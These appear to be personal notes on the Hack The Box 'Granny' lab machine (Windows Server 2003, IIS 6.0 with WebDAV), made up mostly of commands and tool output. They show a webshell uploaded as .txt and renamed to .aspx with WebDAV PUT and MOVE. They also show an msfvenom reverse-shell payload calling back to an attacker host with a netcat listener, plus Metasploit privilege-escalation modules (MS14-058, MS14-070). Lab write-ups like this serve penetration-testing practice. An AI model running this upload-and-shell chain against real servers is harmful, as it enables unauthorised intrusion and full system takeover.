# grany


- Windows Server 2003 SP2
- IIS 6.0 + webdav

- Wabdav PUT .txt, MOVE .aspx
- ms14_058 : metasploit windows/local/ms14_058_track_popup_menu (worked 0xdf)
- ms14_070 : metasploit use exploit/windows/local/ms14_070_tcpip_ioctl (worked medium)
- MS14–070 : TCP/IP IOCTL Privilege Escalation 



Walktrough
- https://0xdf.gitlab.io/2019/03/06/htb-granny.html
- https://medium.com/@conma293/htb-granny-walkthrough-6053a65ff33b

## Nmap

````
# nmap -sC -sV -p 80 -oA scans/scripts PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   WebDAV type: Unkown
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Wed, 06 Mar 2019 20:13:57 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH                                                                                             
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
````


## 80

Header
````
HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://10.10.10.15/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:358"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Wed, 06 Mar 2019 20:15:03 GMT
Connection: close
````
We can tell from “X-Powered-By ASP.NET” that this specific version of IIS Server is executing .NET — which means .aspx format, as opposed to .asp


## Dav

````
# davtest -url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: l8Qkwc
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_l8Qkwc
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jsp
PUT     asp     FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.php
PUT     cgi     FAIL
PUT     aspx    FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.pl
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.cfm
PUT     shtml   FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jhtml
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    pl      FAIL
EXEC    cfm     FAIL
EXEC    jhtml   FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_l8Qkwc
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jsp
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.php
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.pl
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.cfm
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jhtml
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html
Executes: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
Executes: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html
````

We can PUT .txt

## Dav manual test

````
Let PUT a text file and GET it

root@kali# echo yolo > test.txt
root@kali# curl -X PUT http://10.10.10.15/df.txt -d @test.txt 
root@kali# curl http://10.10.10.15/df.txt
yolo
-d @text.txt : the data for the request are the contents of the file text.txt.
````

Try with .asp
````
# curl -X PUT http://10.10.10.15/df.aspx -d @test.txt 
...
Error 403.1 - Forbidden: Execute access is denied.
...
````

## Dav Upload Webshell

Use KAli webshell /usr/share/webshells/aspx/cmdasp.aspx

````
$ cp /usr/share/webshells/aspx/cmdasp.aspx .
````

Now Upload it as .txt
````
$ curl -X PUT http://10.10.10.15/cmdasp.txt -d @cmdasp.aspx 
````
http://10.10.10.15/cmdasp.txt is served as text


For Binary upload
````
$ curl -X PUT http://10.10.10.15/cmdasp.txt --data-binary @cmdasp.aspx 


## Dav Move file

Let use the webdav MOVE command to deplace/rename our shell file.
    -X MOVE  
    -H 'Destination:http://10.10.10.15/cmdasp.aspx'  : target name
    http://10.10.10.15/cmdasp.txt - our file  

````
$ curl -X MOVE -H 'Destination:http://10.10.10.15/cmdasp.aspx' http://10.10.10.15/cmdasp.txt
````


## Method 2 : Msfvenom+cadaver
````
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.19 LPORT=555 --platform windows -a x86 -e generic/none -f aspx -o go.txt
cadaver 10.10.10.15
ls
put go.txt
move go.txt go.aspx
ls
````
````
nc -nlvp 555
http://10.10.10.15/go.aspx
````

## Elevzation

### MS14-058 : use windows/local/ms14_058_track_popup_menu

Use metasploit...

### ‘KiTrap0D’ MS10–015 via Metasploit.

Use metasploit...

### MS14–070 : TCP/IP IOCTL Privilege Escalation 
https://www.exploit-db.com/exploits/37755
